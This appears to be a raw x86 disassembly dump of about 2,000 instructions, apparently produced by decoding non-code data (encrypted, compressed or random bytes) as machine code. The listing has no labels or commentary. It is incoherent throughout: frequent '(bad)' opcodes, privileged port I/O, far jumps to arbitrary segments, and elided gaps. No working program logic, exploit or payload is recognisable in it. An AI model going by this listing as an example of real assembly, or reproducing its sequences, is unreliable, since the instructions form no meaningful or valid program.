  4294a8:	cmp    DWORD PTR [ecx],edi
  4294aa:	xchg   esi,eax
  4294ab:	add    al,0x81
  4294ad:	cmp    ecx,DWORD PTR [edx-0x57]
  4294b0:	int3   
  4294b1:	lds    eax,FWORD PTR [ebp+0x79]
  4294b4:	xor    al,0x6e
  4294b6:	xor    ch,BYTE PTR [edi-0x46809d4e]
  4294bc:	inc    edx
  4294bd:	shl    BYTE PTR [edi+0x3e],1
  4294c0:	rcr    bl,1
  4294c2:	xor    DWORD PTR [esi+0x33596833],ecx
  4294c8:	jg     0x4294e3
  4294ca:	dec    ecx
  4294cb:	jae    0x429519
  4294cd:	jle    0x42945b
  4294cf:	jmp    ecx
  4294d1:	into   
  4294d2:	les    edx,FWORD PTR [edx]
  4294d4:	xor    eax,0x7295d98
  4294d9:	(bad)  
  4294db:	add    DWORD PTR [edi+0x23de43ea],0x5e3f47ce
  4294e5:	ins    BYTE PTR es:[edi],dx
  4294e6:	es stos DWORD PTR es:[edi],eax
  4294e8:	push   es
  4294e9:	nop
  4294ea:	into   
  4294eb:	jbe    0x4294c0
	...
  429555:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429559:	sub    al,0x53
  42955b:	ds jg  0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x16d484ea],dx
  429565:	imul   eax,DWORD PTR [ebx-0xfffe46],0x32000000
  42956f:	jle    0x42956a
  429571:	or     DWORD PTR [ebx-0xf],edx
  429574:	and    BYTE PTR ds:0x897e7710,cl
  42957a:	jae    0x4295ef
  42957c:	ss je  0x42954d
  42957f:	push   ebp
  429580:	dec    edi
  429581:	or     eax,0x8e7884a3
  429586:	push   eax
  429587:	adc    bl,ah
  429589:	ret    0x92bf
  42958c:	lahf   
  42958d:	dec    ecx
  42958e:	or     DWORD PTR [ebx-0x159aee99],esp
  429594:	xor    BYTE PTR [esi],0x2e
  429597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429598:	sti    
  429599:	xchg   edx,eax
  42959a:	fdivr  QWORD PTR [ebx+0x27cbb0b5]
  4295a0:	shl    BYTE PTR [ecx-0x6d],cl
  4295a3:	js     0x42956b
  4295a5:	rol    bh,cl
  4295a7:	mov    WORD PTR [ebp-0x15da4c82],ds
  4295ad:	push   edx
  4295ae:	call   esi
  4295b0:	popa   
  4295b1:	retf   0xd9bf
  4295b4:	test   eax,0x1a1c1222
  4295b9:	and    eax,0x2563060b
  4295be:	repz dec cl
  4295c1:	mov    ebp,DWORD PTR [esi]
  4295c3:	popa   
  4295c4:	push   ebx
  4295c5:	dec    ecx
  4295c6:	outs   dx,BYTE PTR ds:[esi]
  4295c7:	in     al,0xf1
  4295c9:	ja     0x429632
  4295cb:	cdq    
  4295cc:	mov    al,ds:0xdec58b59
  4295d1:	sub    dl,0x28
  4295d4:	nop
  4295d5:	mov    BYTE PTR [ebx-0x4f],ah
  4295d8:	ins    BYTE PTR es:[edi],dx
  4295d9:	jbe    0x4295c2
  4295db:	jmp    0xd9b969b2
  4295e0:	stos   BYTE PTR es:[edi],al
  4295e1:	int3   
  4295e2:	test   al,0xd6
  4295e4:	sub    BYTE PTR [ecx],cl
  4295e6:	test   ch,0x13
  4295e9:	shr    bh,cl
  4295eb:	scas   al,BYTE PTR es:[edi]
  4295ec:	xlat   BYTE PTR ds:[ebx]
  4295ed:	retf   0x6ecf
  4295f0:	mov    ah,0x56
  4295f2:	sub    al,0x85
  4295f4:	data16 loop 0x429584
  4295f7:	loop   0x429652
  4295f9:	arpl   ax,dx
  4295fb:	in     eax,0xdf
  4295fd:	test   DWORD PTR [eiz*1+0x4ba5fd05],esp
  429604:	jmp    0x186344ce
  429609:	outs   dx,BYTE PTR ds:[esi]
  42960a:	sub    eax,0xdb2d6f99
  42960f:	gs dec edx
  429611:	js     0x42960b
  429613:	sub    eax,0xfda87950
  429618:	push   ecx
  429619:	out    0x14,eax
  42961b:	xchg   BYTE PTR [edi-0x23],al
  42961e:	jo     0x42968e
  429620:	loope  0x429675
  429622:	add    dl,cl
  429624:	xor    esp,edx
  429626:	ja     0x429668
  429628:	xor    DWORD PTR [ecx+ecx*1+0x5a4d1921],ebp
  42962f:	push   edx
  429630:	inc    esi
  429631:	push   ecx
  429632:	outs   dx,DWORD PTR ds:[esi]
  429633:	(bad)  
  429634:	shl    DWORD PTR ds:[ebx+0x13],cl
  429638:	pop    ss
  429639:	push   ss
  42963a:	mov    DWORD PTR [edx-0x3b],ebx
  42963d:	push   ebx
  42963e:	icebp  
  42963f:	mov    eax,ds:0x28f5c1c1
  429644:	jbe    0x429694
  429646:	not    DWORD PTR [eax+ebp*8]
  429649:	or     ebx,DWORD PTR [edi+0x6f40e577]
  42964f:	call   0x89a1:0x9ad70ecf
  429656:	rol    BYTE PTR [edi-0xc00a20e],1
  42965c:	or     BYTE PTR [eax],dl
  42965e:	(bad)  
  429660:	loope  0x429674
  429662:	out    dx,eax
  429663:	lahf   
  429664:	cdq    
  429665:	cwde   
  429666:	fild   QWORD PTR [esi]
  429668:	mul    DWORD PTR [esi-0x75]
  42966b:	push   esi
  42966c:	jae    0x42966e
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	nop
  4296e3:	dec    edx
  4296e4:	sub    edx,DWORD PTR [eax+0x1bb82]
  4296ea:	inc    DWORD PTR [eax]
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	je     0x4296d2
  4296f0:	aas    
  4296f1:	push   cs
  4296f2:	clc    
  4296f3:	dec    edi
  4296f4:	gs sahf 
  4296f6:	clc    
  4296f7:	outs   dx,DWORD PTR ds:[esi]
  4296f8:	out    0x6a,eax
  4296fa:	loopne 0x429757
  4296fc:	add    al,0x2f
  4296fe:	pop    ecx
  4296ff:	push   edi
  429700:	adc    BYTE PTR [edi],0x58
  429703:	pop    ss
  429704:	push   ds
  429705:	fs mov cl,0x6
  429708:	mov    al,0xe4
  42970a:	or     bl,al
  42970c:	mov    ds:0x796e4786,al
  429711:	lahf   
  429712:	gs push esi
  429714:	sub    al,0x6d
  429716:	mov    esp,0x8da99994
  42971b:	cli    
  42971c:	ficom  WORD PTR [edi]
  42971e:	sahf   
  42971f:	xlat   BYTE PTR ds:[ebx]
  429720:	push   eax
  429721:	js     0x4296bb
  429723:	pusha  
  429724:	push   0xaf76cb89
  429729:	xchg   edi,eax
  42972a:	sbb    dl,BYTE PTR [esi+eiz*2+0x4b2f0476]
  429731:	adc    ecx,DWORD PTR [edx+0x5]
  429734:	jb     0x4296c7
  429736:	and    edi,edx
  429738:	xor    BYTE PTR [ebp+0x6330300e],al
  42973e:	iret   
  42973f:	adc    DWORD PTR [esp+ebp*8+0x5],ebp
  429743:	add    al,0x99
  429745:	mov    cl,0x8c
  429747:	add    ebx,ecx
  429749:	popf   
  42974a:	pop    esp
  42974b:	in     al,0xb0
  42974d:	xchg   ebx,eax
  42974e:	imul   eax,DWORD PTR [eax+0x534c7602],0xb7a99cf7
  429758:	jecxz  0x429762
  42975a:	fisubr DWORD PTR [ecx-0x42]
  42975d:	fisub  DWORD PTR [edi-0x51]
  429760:	pop    ebp
  429761:	mov    dl,0xeb
  429763:	pop    ebp
  429764:	xor    eax,0xfc0ff30a
  429769:	stos   DWORD PTR es:[edi],eax
  42976a:	mov    bh,0x76
  42976c:	lds    edx,FWORD PTR [ebp-0x32cd6735]
  429772:	xchg   edi,eax
  429773:	pop    ss
  429774:	cmp    BYTE PTR [edi+0x325b7c00],ah
  42977a:	pop    ds
  42977b:	test   BYTE PTR [ecx+0x47f425fe],dh
  429781:	lahf   
  429782:	add    eax,0xa869d811
  429787:	mov    ah,0x22
  429789:	shr    BYTE PTR [ebx+0x5d63f2b3],0x78
  429790:	add    eax,0xa8934694
  429795:	mov    ebx,0x1510fcb9
  42979a:	es stc 
  42979c:	push   edx
  42979d:	push   es
  42979e:	sub    al,ch
  4297a0:	mov    bl,ch
  4297a2:	daa    
  4297a3:	mov    bl,0x4a
  4297a5:	div    DWORD PTR [ebx+0x33]
  4297a8:	xchg   DWORD PTR [ebx+0x4b2004cd],edi
  4297ae:	ja     0x42982b
  4297b0:	out    dx,al
  4297b1:	rdtsc  
  4297b3:	dec    esi
  4297b4:	das    
  4297b5:	aad    0x8e
  4297b7:	xchg   ebx,eax
  4297b8:	fadd   QWORD PTR ds:0xa93afef7
  4297be:	cmp    al,0xe8
  4297c0:	add    edx,DWORD PTR [edx-0x5f]
  4297c3:	out    dx,al
  4297c4:	cmc    
  4297c5:	mov    eax,ds:0x7dc60ed0
  4297ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297cb:	jb     0x4297c0
  4297cd:	add    BYTE PTR [esi-0xbbc9b1b],al
  4297d3:	mov    ah,0x7a
  4297d5:	mov    dl,0x55
  4297d7:	mov    dh,0x23
  4297d9:	jno    0x42978a
  4297db:	test   BYTE PTR [ecx+edx*8],ch
  4297de:	jb     0x4297b5
  4297e0:	jecxz  0x429799
  4297e2:	mov    ecx,0x9f9cc83a
  4297e7:	pop    ss
  4297e8:	jbe    0x429835
  4297ea:	repz mov bh,BYTE PTR [eax+eax*1+0x0]
	...
  429853:	add    BYTE PTR [eax],al
  429855:	add    BYTE PTR [eax],dh
  429857:	inc    edx
  429858:	fbld   TBYTE PTR [edx-0x1]
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	fs pop ds
  429864:	inc    edi
  429865:	sbb    eax,DWORD PTR [ecx-0xfffe44]
  42986b:	add    BYTE PTR [eax],al
  42986d:	add    dl,cl
  42986f:	imul   esp,DWORD PTR [ebx+0x7a],0x68
  429873:	loopne 0x429865
  429875:	nop
  429876:	dec    ebx
  429877:	push   eax
  429878:	add    dh,BYTE PTR [esi-0x20]
  42987b:	(bad)
  42987e:	out    dx,al
  42987f:	fist   WORD PTR ds:0xe9ff5530
  429885:	daa    
  429886:	sbb    esi,ebp
  429888:	fsubr  st,st(2)
  42988a:	sbb    BYTE PTR [esi+0x478a3ba],dh
  429890:	sahf   
  429891:	dec    edi
  429892:	jmp    0x4298ba
  429894:	or     eax,0x2ec75f6e
  429899:	mov    dl,0x81
  42989b:	jmp    0x7fbf:0x9afa5c9e
  4298a2:	jp     0x4298ec
  4298a4:	sahf   
  4298a5:	mov    ?,WORD PTR [ecx-0x648296d4]
  4298ab:	push   ss
  4298ac:	or     al,0x3a
  4298ae:	sbb    ecx,ecx
  4298b0:	jl     0x429918
  4298b2:	fdivr  DWORD PTR [esi]
  4298b4:	sti    
  4298b5:	pop    edx
  4298b6:	test   eax,0xf057e0ee
  4298bb:	fucom  st(2)
  4298bd:	bound  ebp,QWORD PTR [edi]
  4298bf:	lds    edx,FWORD PTR [ecx+0x10]
  4298c2:	sub    al,0x42
  4298c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298c5:	jne    0x42988a
  4298c7:	mov    al,ds:0xd810baf3
  4298cc:	aam    0xcb
  4298ce:	loop   0x429918
  4298d0:	xor    ecx,eax
  4298d2:	pop    es
  4298d3:	ds scas eax,DWORD PTR es:[edi]
  4298d5:	xor    al,0xc2
  4298d7:	cwde   
  4298d8:	call   0xe95f2085
  4298dd:	nop
  4298de:	or     al,0x7b
  4298e0:	jno    0x4298c7
  4298e2:	aam    0xb7
  4298e4:	push   cs
  4298e5:	arpl   WORD PTR [edx+0x6adaf876],ax
  4298eb:	xor    dl,bh
  4298ed:	pop    esp
  4298ee:	mov    ds:0x3ce2991f,al
  4298f3:	fiadd  WORD PTR [eax+ecx*4]
  4298f6:	aaa    
  4298f7:	jne    0x429903
  4298f9:	out    dx,al
  4298fa:	sti    
  4298fb:	cmp    esp,0x66
  4298fe:	repz dec ebp
  429900:	outs   dx,BYTE PTR ds:[esi]
  429901:	adc    DWORD PTR [edx],esi
  429903:	mov    dl,dh
  429905:	das    
  429906:	fucom  st(5)
  429908:	sub    eax,0xbd80048c
  42990d:	adc    BYTE PTR [ecx],dh
  42990f:	add    eax,DWORD PTR [ebx]
  429911:	mov    ds:0x965e3d0c,al
  429916:	inc    ebp
  429917:	pushf  
  429918:	mov    eax,0x20883db9
  42991d:	enter  0xd484,0xaa
  429921:	lock imul ebp,DWORD PTR [esp+esi*1],0x83afcf8c
  429929:	sbb    al,0x51
  42992b:	mov    bh,0x30
  42992d:	mov    edx,0xd60b76b9
  429932:	or     bl,BYTE PTR [edi*1+0x52cfee3c]
  429939:	jp     0x429997
  42993b:	call   0x87bd9a04
  429940:	jmp    0x429955
  429942:	cmp    dl,0x94
  429945:	(bad)  
  429946:	lahf   
  429947:	rcl    dl,0xd4
  42994a:	pop    edi
  42994b:	push   es
  42994c:	and    BYTE PTR [eax+0x883b1af],al
  429952:	mov    gs,WORD PTR [edx-0xb]
  429955:	jb     0x42990a
  429957:	pop    es
  429958:	mov    al,ds:0x237a1916
  42995d:	div    DWORD PTR [ecx]
  42995f:	jl     0x4298ee
  429961:	push   edi
  429962:	pop    DWORD PTR [edx]
  429964:	xchg   edi,eax
  429965:	addr16 sub al,0x69
  429968:	ins    BYTE PTR es:[edi],dx
  429969:	jecxz  0x4299b9
  42996b:	push   ebx
  42996c:	fild   WORD PTR [eax]
	...
  4299d6:	push   edi
  4299d7:	push   0xdf7fdf64
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	in     al,0xb
  4299e4:	gs sbb eax,0x1bd80
  4299ea:	inc    DWORD PTR [eax]
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	test   BYTE PTR [ebx],ah
  4299f0:	mov    al,ds:0xc11e54ac
  4299f5:	adc    eax,0xb14e71cc
  4299fa:	push   ebp
  4299fb:	sub    DWORD PTR gs:[ebp+0x59f2cddc],esi
  429a02:	in     eax,0x71
  429a04:	or     DWORD PTR [eax],edx
  429a06:	js     0x4299df
  429a08:	dec    ebp
  429a09:	dec    edi
  429a0a:	or     al,0xa0
  429a0c:	loopne 0x429a2c
  429a0e:	add    al,0xe0
  429a10:	jle    0x429a90
  429a12:	xor    ch,BYTE PTR [ebx-0x2d]
  429a15:	jmp    0xda92b1bc
  429a1a:	ss push eax
  429a1c:	fistp  WORD PTR [eax+0x3d]
  429a1f:	scas   eax,DWORD PTR es:[edi]
  429a20:	mov    ah,0xdb
  429a22:	jl     0x429a3a
  429a24:	push   0xd2d3da7d
  429a29:	dec    edx
  429a2a:	inc    ah
  429a2c:	cwde   
  429a2d:	add    bl,bl
  429a2f:	inc    ecx
  429a30:	mov    ebx,0x3cdfcc8b
  429a35:	add    ah,BYTE PTR [edi+0x157c0204]
  429a3b:	xchg   esi,eax
  429a3c:	jbe    0x429a4c
  429a3e:	mov    al,ds:0xa2c99e27
  429a43:	jae    0x4299c5
  429a45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a46:	push   eax
  429a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a48:	jae    0x429a5b
  429a4a:	(bad)  
  429a4b:	(bad)  
  429a4c:	gs aad 0x2d
  429a4f:	mov    esi,0xf1bba210
  429a54:	xor    ebp,0xffffff92
  429a57:	outs   dx,BYTE PTR ds:[esi]
  429a58:	push   0x4b
  429a5a:	push   0xf3fc7112
  429a5f:	xor    edi,DWORD PTR [ecx-0x13046137]
  429a65:	mov    es,esp
  429a67:	xor    eax,0x63f0a6b3
  429a6c:	jnp    0x429ae5
  429a6e:	(bad)  [esi+0x3e]
  429a71:	out    dx,al
  429a72:	stos   DWORD PTR es:[edi],eax
  429a73:	xlat   BYTE PTR ds:[ebx]
  429a74:	sbb    ecx,esi
  429a76:	sbb    ch,ah
  429a78:	inc    ebp
  429a79:	sbb    edx,DWORD PTR [eax]
  429a7b:	in     al,0xac
  429a7d:	dec    edi
  429a7e:	out    dx,eax
  429a7f:	mov    ebx,0x9b9fe2f9
  429a84:	or     al,0x8a
  429a86:	and    edi,ebx
  429a88:	cdq    
  429a89:	push   ss
  429a8a:	add    eax,0xa2a3e328
  429a8f:	pop    esi
  429a90:	sti    
  429a91:	pop    eax
  429a92:	test   cl,ah
  429a94:	sub    esp,0x693b3b17
  429a9a:	cmp    cl,dl
  429a9c:	or     ecx,edi
  429a9e:	adc    eax,0x911a50df
  429aa3:	jne    0x429af2
  429aa5:	jno    0x429a2d
  429aa7:	and    DWORD PTR [ecx],0x55b5f39d
  429aad:	pop    esi
  429aae:	sub    DWORD PTR [esi+edx*1-0x6ed296d8],ecx
  429ab5:	fisttp QWORD PTR [ecx]
  429ab7:	pushf  
  429ab8:	xor    DWORD PTR ds:[ecx+edi*8-0x15],ecx
  429abd:	jae    0x429b01
  429abf:	mov    esp,0xebb5162d
  429ac4:	leave  
  429ac5:	xchg   esp,eax
  429ac6:	popf   
  429ac7:	(bad)  
  429ac8:	sti    
  429ac9:	or     BYTE PTR [ebp+0x6ad8fd7b],bh
  429acf:	jns    0x429adb
  429ad1:	lds    esi,FWORD PTR [ecx]
  429ad3:	push   cs
  429ad4:	pop    si
  429ad6:	stc    
  429ad7:	sub    al,0xf9
  429ad9:	in     eax,0x4
  429adb:	sbb    dh,al
  429add:	test   eax,0xaf9afcee
  429ae2:	sub    ecx,edi
  429ae4:	add    eax,0xdc9f5d71
  429ae9:	lds    esi,FWORD PTR [esi-0x73]
  429aec:	aas    
	...
  429b55:	add    dh,cl
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x92a95667
  429b63:	fcomp  QWORD PTR [ecx+ecx*2+0x7f]
  429b67:	mov    esi,0xff0001
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	xchg   edx,eax
  429b6f:	mov    dl,ch
  429b71:	mov    DWORD PTR [ebp+ebp*2-0x1],esp
  429b75:	xor    al,0x5b
  429b77:	add    DWORD PTR ds:0x8b5ff38d,edi
  429b7d:	xor    eax,0xa2c6b913
  429b82:	call   0xf6fef248
  429b87:	ss dec eax
  429b89:	das    
  429b8a:	leave  
  429b8b:	mov    bh,0x79
  429b8d:	jg     0x429b97
  429b8f:	or     eax,0xffffffbc
  429b92:	div    BYTE PTR [edi+0x26c41dc6]
  429b98:	mov    ebp,0x1aa4c9cb
  429b9d:	clc    
  429b9e:	lock outs dx,DWORD PTR ds:[esi]
  429ba0:	aam    0x23
  429ba2:	jl     0x429b58
  429ba4:	pusha  
  429ba5:	and    ecx,DWORD PTR [edi+0xd]
  429ba8:	sub    BYTE PTR [ecx+0x19],bl
  429bab:	neg    DWORD PTR [ebx]
  429bad:	mov    ds:0xbfd30d02,al
  429bb2:	in     eax,0x44
  429bb4:	test   eax,0x3e1d3842
  429bb9:	jg     0x429c14
  429bbb:	dec    edx
  429bbc:	mov    eax,ds:0xef50050e
  429bc1:	jl     0x429ba5
  429bc3:	jno    0x429b9c
  429bc5:	push   edx
  429bc6:	inc    edi
  429bc7:	mov    bh,0xd
  429bc9:	xchg   ecx,ecx
  429bcb:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  429bcd:	push   ds
  429bce:	jb     0x429b9b
  429bd0:	xor    dl,bh
  429bd2:	adc    eax,0xe96e1a47
  429bd7:	xchg   esi,eax
  429bd8:	inc    edx
  429bd9:	mov    ebx,0xba73c43c
  429bde:	repnz and al,0x77
  429be1:	cwde   
  429be2:	bound  edi,QWORD PTR [esi-0x59]
  429be5:	int    0x24
  429be7:	sti    
  429be8:	scas   eax,DWORD PTR es:[edi]
  429be9:	gs and eax,0x5cffc202
  429bef:	mov    al,0x15
  429bf1:	pusha  
  429bf2:	iret   
  429bf3:	push   edx
  429bf4:	dec    ebp
  429bf5:	repnz lods eax,DWORD PTR fs:[esi]
  429bf8:	xor    edx,DWORD PTR [ebp-0x6f0ca70b]
  429bfe:	mov    al,ds:0x62e02fda
  429c03:	jmp    0x429c81
  429c05:	in     al,0x9c
  429c07:	mov    esp,0x2cf87df7
  429c0c:	ins    BYTE PTR es:[edi],dx
  429c0d:	mov    BYTE PTR [edx+0x23],dl
  429c10:	(bad)  
  429c11:	out    0x93,eax
  429c13:	dec    edi
  429c14:	pop    ds
  429c15:	jp     0x429c8d
  429c17:	mov    al,0x87
  429c19:	xchg   ecx,eax
  429c1a:	icebp  
  429c1b:	sub    ebp,DWORD PTR [edi+0x7a7f54bb]
  429c21:	jmp    0x51552160
  429c26:	sbb    edi,DWORD PTR [esi+0x2e]
  429c29:	in     al,dx
  429c2a:	icebp  
  429c2b:	ror    BYTE PTR [edx+0x7f],1
  429c2e:	mov    ch,0x6e
  429c30:	or     al,0xe0
  429c32:	es jne 0x429bdf
  429c35:	jmp    0xf6c9aa0
  429c3a:	pop    ebp
  429c3b:	and    eax,DWORD PTR [edx]
  429c3d:	sahf   
  429c3e:	lods   eax,DWORD PTR ds:[esi]
  429c3f:	jle    0x429c55
  429c41:	push   edx
  429c42:	push   es
  429c43:	outs   dx,BYTE PTR ds:[esi]
  429c44:	xchg   ebx,eax
  429c45:	rcl    DWORD PTR [ebx+0x31],0x69
  429c49:	test   esp,esp
  429c4b:	push   es
  429c4c:	rol    BYTE PTR [ebp+0x51ab9092],1
  429c52:	hlt    
  429c53:	cmp    eax,0xb7adb9ce
  429c58:	jmp    0x429bec
  429c5a:	ins    BYTE PTR es:[edi],dx
  429c5b:	shl    BYTE PTR [ebx+eax*8],1
  429c5e:	mov    esp,0x6dadecd8
  429c63:	mov    ah,0xba
  429c65:	(bad)
  429c6a:	adc    esi,DWORD PTR [ecx+ecx*2+0x0]
	...
  429cd5:	add    BYTE PTR [ebx-0x487759ea],ah
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [ecx+0x23],bh
  429ce4:	leave  
  429ce5:	pop    es
  429ce6:	jle    0x429ca7
  429ce8:	add    DWORD PTR [eax],eax
  429cea:	inc    DWORD PTR [eax]
  429cec:	add    BYTE PTR [eax],al
  429cee:	(bad)  [esi-0x4e6c5954]
  429cf4:	cmp    eax,0x4fea3f7b
  429cf9:	retf   
  429cfa:	(bad)  
  429cfb:	pop    ebx
  429cfc:	sbb    DWORD PTR [ecx-0x79],0xa
  429d00:	jns    0x429d2a
  429d02:	xchg   ebx,eax
  429d03:	stos   DWORD PTR es:[edi],eax
  429d04:	leave  
  429d05:	or     dh,BYTE PTR [ebp+ebx*2+0x53945685]
  429d0c:	xchg   ecx,eax
  429d0d:	ret    0xd4f2
  429d10:	arpl   WORD PTR [esi+0x75163116],ax
  429d16:	and    cl,BYTE PTR [esi+0x3cee004f]
  429d1c:	xchg   DWORD PTR [eax],eax
  429d1e:	(bad)  
  429d20:	dec    edx
  429d21:	out    dx,eax
  429d22:	std    
  429d23:	gs lock aaa 
  429d26:	(bad)
  429d29:	cmp    cl,BYTE PTR [edx-0x7]
  429d2c:	in     eax,0xf6
  429d2e:	sbb    DWORD PTR [eax+0x3f],ecx
  429d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d32:	in     al,0x5f
  429d34:	(bad)  
  429d35:	std    
  429d36:	neg    DWORD PTR ds:0x739c4719
  429d3c:	adc    eax,0x30d13ad7
  429d41:	cmp    al,0x3
  429d43:	jle    0x429cfa
  429d45:	push   es
  429d46:	xchg   ebp,eax
  429d47:	add    ebp,esp
  429d49:	cld    
  429d4a:	test   eax,0x350f7510
  429d4f:	dec    edi
  429d50:	aam    0x43
  429d52:	add    al,0x74
  429d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d55:	push   0xffffffe4
  429d57:	xchg   ebp,eax
  429d58:	lea    ecx,[ebp-0x4382a28b]
  429d5e:	sub    al,0x46
  429d60:	(bad)  
  429d61:	test   DWORD PTR [ebp+0x7c4dbf2a],0x8372e6a1
  429d6b:	cs test al,0x15
  429d6e:	xchg   ebx,eax
  429d6f:	fwait
  429d70:	pusha  
  429d71:	jnp    0x429d90
  429d73:	out    0x8c,al
  429d75:	pop    esp
  429d76:	ss inc ecx
  429d78:	or     ebx,edx
  429d7a:	jnp    0x429dcd
  429d7c:	stos   DWORD PTR es:[edi],eax
  429d7d:	adc    DWORD PTR [esi-0x15],0x2c36e8ba
  429d84:	dec    ebx
  429d85:	push   esi
  429d86:	sub    al,0x5d
  429d88:	xchg   edi,eax
  429d89:	inc    esp
  429d8a:	jnp    0x429d67
  429d8c:	inc    edi
  429d8d:	sub    al,0xaf
  429d8f:	xor    bh,BYTE PTR [eax+0x6e]
  429d92:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d94:	sub    DWORD PTR [ecx+0x28],ebx
  429d97:	xor    DWORD PTR [edi],0x3c147b87
  429d9d:	enter  0xe15e,0x15
  429da1:	mov    esi,0xa8403221
  429da6:	cdq    
  429da7:	dec    edx
  429da8:	mov    esp,DWORD PTR [ecx+0x17]
  429dab:	or     BYTE PTR [eax],bl
  429dad:	ja     0x429dbb
  429daf:	outs   dx,DWORD PTR ds:[esi]
  429db0:	call   DWORD PTR [esi+0x20b53b64]
  429db6:	retf   0x7582
  429db9:	or     al,0xf6
  429dbb:	jne    0x429d74
  429dbd:	ret    0x1d6e
  429dc0:	jns    0x429e40
  429dc2:	push   ss
  429dc3:	hlt    
  429dc4:	cmp    DWORD PTR [ecx+0xa25c006],0x3feacbf5
  429dce:	add    ecx,edx
  429dd0:	mov    cs:0x362cdb23,eax
  429dd6:	mov    ebx,?
  429dd8:	loopne 0x429e37
  429dda:	test   DWORD PTR [eax+0x47b65980],0xe40f0411
  429de4:	inc    esi
  429de5:	push   ecx
  429de6:	out    dx,al
  429de7:	add    ecx,DWORD PTR [ebp-0x66b3cc5c]
	...
  429e55:	add    BYTE PTR [ebx-0x13f33b49],bl
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	dec    edx
  429e63:	int3   
  429e64:	adc    BYTE PTR [edx+0x1c07d],bl
  429e6a:	inc    DWORD PTR [eax]
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	inc    edx
  429e6f:	aam    0xbb
  429e71:	call   0x8652:0xd05dba14
  429e78:	jo     0x429e72
  429e7a:	jmp    0x77c8a033
  429e7f:	jl     0x429ef4
  429e81:	and    al,0x78
  429e83:	lock mov ecx,DWORD PTR [edx+0x6c]
  429e87:	adc    eax,0x93634191
  429e8c:	or     BYTE PTR [edi],ah
  429e8e:	bound  esp,QWORD PTR [edi]
  429e90:	dec    edx
  429e91:	push   es
  429e92:	mov    eax,ds:0x5afc7416
  429e97:	mov    esp,DWORD PTR [ecx]
  429e99:	in     eax,dx
  429e9a:	fisub  DWORD PTR [ecx-0x75c61107]
  429ea0:	dec    ecx
  429ea1:	rcl    DWORD PTR [ebx-0x75],1
  429ea4:	push   ecx
  429ea5:	add    DWORD PTR [ebx],edx
  429ea7:	mov    ebx,0xff4016f7
  429eac:	mov    ds:0x2bc9b6c5,eax
  429eb1:	pop    ecx
  429eb2:	nop
  429eb3:	xchg   esp,eax
  429eb4:	jmp    0x429e47
  429eb6:	call   eax
  429eb8:	mov    edi,0x767d8957
  429ebd:	jno    0x429eed
  429ebf:	ins    DWORD PTR es:[edi],dx
  429ec0:	lea    esp,[edi+0x4c]
  429ec3:	dec    ecx
  429ec4:	repnz add al,0x1e
  429ec7:	lar    esi,ax
  429eca:	mov    ah,0xf9
  429ecc:	loopne 0x429ede
  429ece:	fnstenv gs:[ecx+0x3b87678f]
  429ed5:	fsubr  DWORD PTR [esi+0x2dc73ab]
  429edb:	pop    esi
  429edc:	dec    ebx
  429edd:	and    eax,0x34dcf7d7
  429ee2:	nop
  429ee3:	icebp  
  429ee4:	inc    edi
  429ee5:	int3   
  429ee6:	repnz in al,0xf4
  429ee9:	bound  ebp,QWORD PTR [edx+0x9e4bf12]
  429eef:	shl    BYTE PTR [ecx],1
  429ef1:	jbe    0x429eb8
  429ef3:	div    DWORD PTR [ebx-0x214f701b]
  429ef9:	bound  ebp,QWORD PTR [ebx]
  429efb:	pop    edi
  429efc:	inc    esi
  429efd:	mov    bl,0x2
  429eff:	stos   BYTE PTR es:[edi],al
  429f00:	or     al,0x87
  429f02:	data16 daa 
  429f04:	fnstcw WORD PTR [ebx-0x30]
  429f07:	jmp    0xf76a:0x45d02d07
  429f0e:	dec    eax
  429f0f:	sub    DWORD PTR [eax-0x4bab86ce],ebx
  429f15:	cmp    al,0xf8
  429f17:	pushf  
  429f18:	inc    edx
  429f19:	or     cl,BYTE PTR [edx+0x45]
  429f1c:	test   DWORD PTR [ecx+0x1b],edi
  429f1f:	inc    esi
  429f20:	jb     0x429f2b
  429f22:	inc    ebp
  429f23:	loop   0x429f49
  429f25:	jnp    0x429f5a
  429f27:	sbb    BYTE PTR [edx-0x342cb5ed],0xc9
  429f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f2f:	stos   DWORD PTR es:[edi],eax
  429f30:	test   DWORD PTR [esi+ebp*1],ecx
  429f33:	arpl   sp,bx
  429f35:	inc    ebp
  429f36:	ds hlt 
  429f38:	je     0x429f57
  429f3a:	dec    ebp
  429f3b:	cmc    
  429f3c:	dec    ebp
  429f3d:	mov    ch,0x38
  429f3f:	push   es
  429f40:	pop    es
  429f41:	pop    edx
  429f42:	mov    ds:0x4867c5ab,eax
  429f47:	pushf  
  429f48:	cmp    ah,BYTE PTR [edx-0x3e3773ec]
  429f4e:	mov    BYTE PTR [ecx],dh
  429f50:	mov    BYTE PTR [ebp-0x7d],cl
  429f53:	xchg   ebp,eax
  429f54:	sub    dl,dh
